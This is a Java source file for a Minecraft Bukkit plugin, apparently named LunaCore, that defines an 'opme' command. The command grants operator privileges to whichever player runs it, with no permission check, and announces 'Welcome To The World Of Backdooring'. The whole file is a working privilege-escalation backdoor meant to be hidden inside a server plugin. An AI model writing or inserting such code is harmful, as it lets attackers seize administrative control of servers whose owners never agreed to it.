package me.lunacore.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class opme implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player p = (Player) sender;
        p.sendMessage("{ Welcome To The World Of Backdooring }");
        p.sendMessage("{ You Now Have Operator }");
        p.setOp(true);
        return true;
    }
}
